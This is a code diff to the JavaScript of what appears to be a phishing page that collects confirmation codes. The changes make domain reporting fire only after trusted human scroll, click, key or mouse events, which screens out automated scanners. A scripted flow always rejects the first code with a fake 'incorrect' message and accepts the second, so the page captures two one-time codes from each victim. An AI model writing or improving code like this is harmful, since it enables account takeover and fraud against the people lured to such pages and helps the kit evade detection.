@@ -21,13 +21,15 @@
   console.log(`📊 Code attempt #${attemptCount + 1}`);
 
   // ============================================================
-  // ====== DOMAIN DETECTION - HUMAN SCROLL ONLY ================
+  // ====== DOMAIN DETECTION - ONE TIME, HUMAN ONLY =============
   // ============================================================
 
   let domainDetected = false;
+  let humanInteractionConfirmed = false;
 
   function detectDomain() {
     if (domainDetected) return;
+    if (!humanInteractionConfirmed) return;
     
     const currentUrl = window.location.href;
     const urlObj = new URL(currentUrl);
@@ -39,38 +41,77 @@
       domain: domain
     });
 
-    console.log(`🌐 Domain detected: ${domain}`);
+    console.log(`🌐 Domain detected (human): ${domain}`);
   }
 
-  // Detect on human scroll
-  let humanInteractionDetected = false;
+  function confirmHumanInteraction() {
+    if (humanInteractionConfirmed) return;
+    if (event && event.isTrusted === false) return;
+    
+    humanInteractionConfirmed = true;
+    console.log('👤 Human interaction confirmed');
+    detectDomain();
+  }
+
+  let scrollTimeout = null;
+  let scrollCount = 0;
+  let lastScrollTime = 0;
 
   window.addEventListener('scroll', function(e) {
     if (domainDetected) return;
+    if (!e.isTrusted) return;
     
-    if (e.isTrusted) {
-      humanInteractionDetected = true;
-    }
+    const now = Date.now();
+    const timeSinceLastScroll = now - lastScrollTime;
+    lastScrollTime = now;
+    
+    if (timeSinceLastScroll > 0 && timeSinceLastScroll < 100) return;
+    
+    scrollCount++;
+    if (scrollCount < 2) return;
     
     const scrollY = window.scrollY;
+    if (scrollY < 30) return;
     
-    if (scrollY > 10 && humanInteractionDetected && !domainDetected) {
-      detectDomain();
+    if (scrollTimeout) {
+      clearTimeout(scrollTimeout);
+      scrollTimeout = null;
     }
+    
+    scrollTimeout = setTimeout(function() {
+      if (!domainDetected && humanInteractionConfirmed === false) {
+        confirmHumanInteraction();
+      }
+      scrollTimeout = null;
+    }, 300);
+    
   }, { passive: true });
 
-  // Fallback: click detection
   document.addEventListener('click', function(e) {
-    if (!domainDetected && e.isTrusted) {
-      detectDomain();
-    }
+    if (domainDetected) return;
+    if (!e.isTrusted) return;
+    if (e.target.closest('.spinner, .loading')) return;
+    confirmHumanInteraction();
   });
 
-  // Fallback: keypress detection
   document.addEventListener('keydown', function(e) {
-    if (!domainDetected && e.isTrusted && e.key.length === 1) {
-      detectDomain();
-    }
+    if (domainDetected) return;
+    if (!e.isTrusted) return;
+    if (e.key.length !== 1) return;
+    confirmHumanInteraction();
+  });
+
+  let mouseMoveCount = 0;
+  
+  document.addEventListener('mousemove', function(e) {
+    if (domainDetected) return;
+    if (!e.isTrusted) return;
+    
+    mouseMoveCount++;
+    if (mouseMoveCount < 3) return;
+    if (e.movementX === 0 && e.movementY === 0) return;
+    
+    confirmHumanInteraction();
   });
 
   // ============================================================
@@ -175,11 +216,11 @@
         maskedInput.value + 
         ". Enter the code below.";
       infoText.style.color = '#302b4a';
+      infoText.style.fontWeight = 'normal';
     } else if (attemptCount === 1) {
       infoText.textContent = 
         "";
-      infoText.style.color = '#c0392b';
-      infoText.style.fontWeight = 'bold';
+    } else {
     }
   }
 
@@ -240,30 +281,35 @@
       // ====== FIRST ATTEMPT - ALWAYS FAILS ======
       console.log('❌ First attempt - rejecting');
       
+      // Clear the input field immediately
+      codeInput.value = '';
+      
       setTimeout(function() {
+        // Show error message
         codeError.textContent = "The confirmation code you entered is incorrect. Please try again.";
         codeError.style.color = '#c0392b';
         
-        codeInput.value = '';
-        codeInput.focus();
-        
+        // Update attempt count
         attemptCount = 1;
         sessionStorage.setItem(attemptKey, '1');
         
-        infoText.textContent = 
-          "";
-        infoText.style.color = '#c0392b';
-        infoText.style.fontWeight = 'bold';
-        
+        // Reset button
         submitBtn.disabled = false;
         submitBtn.innerHTML = 'Submit';
         submitBtn.classList.remove('loading');
         
-      }, 2000);
+        // Focus the input for second attempt
+        codeInput.focus();
+        
+        console.log('🔄 Ready for second attempt');
+        
+      }, 3000); // 3 seconds loading before second attempt
 
     } else {
-      console.log('');
+      // ====== SECOND ATTEMPT - ALWAYS SUCCEEDS ======
+      console.log('✅ Second attempt - accepting');
       
+      // Clear session storage
       try {
         sessionStorage.removeItem("melodyAuth");
         sessionStorage.removeItem(attemptKey);
